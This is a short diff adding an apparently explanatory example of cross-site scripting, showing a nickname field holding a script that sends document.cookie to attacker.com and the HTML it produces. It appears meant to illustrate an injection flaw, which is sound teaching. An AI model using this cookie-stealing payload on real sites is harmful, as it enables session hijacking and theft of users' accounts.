@@ -1,0 +1,9 @@
+# If user enters:
+nickname = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"  
+
+# HTML becomes:
+<h1>Welcome, 
+    <script>
+        fetch('http://attacker.com/steal?cookie=' + document.cookie);
+    </script>
+</h1>
